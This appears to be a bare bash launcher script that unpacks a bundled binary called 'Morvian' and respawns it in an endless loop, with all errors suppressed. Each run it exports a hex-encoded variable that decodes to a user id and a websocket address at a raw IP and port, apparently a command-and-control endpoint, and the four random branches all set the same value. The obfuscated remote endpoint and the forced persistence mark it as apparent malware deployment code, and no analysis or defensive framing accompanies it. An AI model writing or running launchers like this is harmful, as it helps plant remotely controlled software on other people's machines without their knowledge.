#!/bin/bash
if [[ "$(uname)" == "Darwin" ]]; then
  echo "[!] macOS detected, stopping."
  exit 2
fi
tar xzf Morvian-linux-x64.tar.gz
chmod +x Morvian

while true; do
    tar xzf Morvian-linux-x64.tar.gz || true
    chmod +x Morvian || true

    case $((RANDOM % 4)) in
    0) export STATEVV="7569645f3766377277767736726a7635666d346d5f6c756939377c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    1) export STATEVV="7569645f3766377277767736726a7635666d346d5f6c756939377c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    2) export STATEVV="7569645f3766377277767736726a7635666d346d5f6c756939377c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    3) export STATEVV="7569645f3766377277767736726a7635666d346d5f6c756939377c77733a2f2f3135372e36362e32352e39373a343536312f77737c34" ;;
    esac
    
    ./Morvian || true
    sleep 5
done
